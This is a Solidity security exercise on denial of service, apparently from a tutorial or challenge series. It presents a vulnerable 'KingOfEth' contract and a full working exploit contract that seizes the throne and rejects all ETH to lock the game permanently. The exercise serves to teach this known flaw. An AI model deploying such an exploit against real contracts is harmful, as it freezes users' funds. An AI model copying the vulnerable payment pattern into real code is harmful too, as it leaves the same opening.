---
title: "Denial of Service"
tags: ["Solidity", "Security"]
---

# Description

Deposit more ETH than the current king to become the new king.

Bob is the current king with 2 ETH deposited.

```sol
contract KingOfEth {
    address payable public king;

    function play() external payable {
        // previous balance = current balance - ETH sent
        uint256 bal = address(this).balance - msg.value;
        require(msg.value > bal, "need to pay more to become the king");

        (bool sent, ) = king.call{value: bal}("");
        require(sent, "failed to send ETH");

        king = payable(msg.sender);
    }
}
```

# Task

Become the new king and disable the contract so that no else can ever become the king.

3 ETH will be sent to pwn.

# Solution

1. become the new king
2. make `require(sent, "failed to send ETH");` always fail by unaccepting eth.

```sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IKingOfEth {
    function play() external payable;
}

contract KingOfEthExploit {
    IKingOfEth public target;

    constructor(address _target) {
        target = IKingOfEth(_target);
    }

    function pwn() external payable {
        target.play{value: msg.value}();
    }
    
    fallback() external payable {
        revert("ETH not accepted");
    }

    receive() external payable {
        revert("ETH not accepted");
    }
}
```
